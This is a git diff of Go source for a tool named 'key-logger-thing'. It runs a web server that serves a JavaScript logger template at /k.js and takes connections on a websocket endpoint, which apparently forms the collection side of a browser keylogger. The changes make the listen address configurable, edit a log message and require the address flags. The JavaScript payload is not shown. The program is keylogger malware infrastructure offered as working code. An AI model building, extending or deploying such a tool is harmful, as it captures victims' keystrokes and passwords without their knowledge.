@@ -21,19 +21,21 @@ var rootCmd = &cobra.Command{
 	Use:   "key-logger-thing",
 	Short: "Logs the keys",
 	Run: func(cmd *cobra.Command, args []string) {
-		fmt.Printf("Listen Address: %s\n", listenAddr)
+		fmt.Printf("Listening on: %s\n", listenAddr)
 		fmt.Printf("Websocket address: %s\n", websocketAddr)
 
 		r := chi.NewRouter()
 		r.Get("/ws", serveWebsocket)
 		r.Get("/k.js", serveHTTP)
-		log.Fatal(http.ListenAndServe(":8080", r))
+		log.Fatal(http.ListenAndServe(fmt.Sprintf("%s", listenAddr), r))
 	},
 }
 
 func init() {
 	rootCmd.Flags().StringVarP(&listenAddr, "listenAddress", "l", "", "The address to listen on")
 	rootCmd.Flags().StringVarP(&websocketAddr, "websocketAddress", "w", "", "Address for websocket connection")
+	rootCmd.MarkFlagRequired("listenAddress")
+	rootCmd.MarkFlagRequired("websocketAddress")
 
 	var err error
 	jsTemplate, err = template.ParseFiles("logger.js")
